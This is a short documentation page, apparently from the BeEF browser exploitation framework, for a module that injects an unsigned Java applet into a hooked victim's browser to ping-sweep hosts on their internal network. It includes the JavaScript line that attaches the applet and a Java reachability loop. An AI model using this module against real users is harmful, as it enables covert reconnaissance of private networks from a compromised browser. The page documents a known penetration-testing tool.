## Summary

* **Objective**: Perform a ping sweep of the network via Java
* **Authors**: antisnatchor
* **Browsers**: Safari, Opera, IE

* [Code](https://github.com/beefproject/beef/tree/master/modules/network/ping_sweep_java)

## Internal Working

Uses an unsigned Java applet (which means it won't run for updated Java and Browser versions) to ping hosts in the network.

snippet from command.js
```js

beef.dom.attachApplet('pingSweep', 'pingSweep', 'pingSweep', beef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+"/", null, [{'ipRange':ipRange, 'timeout':timeout}]);

```

java snippet
```java
private static String checkHosts(List<InetAddress> inetAddresses) throws IOException {
    String alive = "";
    for (InetAddress inetAddress : inetAddresses) {
        if (inetAddress.isReachable(timeout)) {
            alive += inetAddress.toString() + "\n";
        }
    }
    return alive;
}
```

## Screenshots

[[Images/module-ping-sweep-java1.png|align=center]]


## Feedback
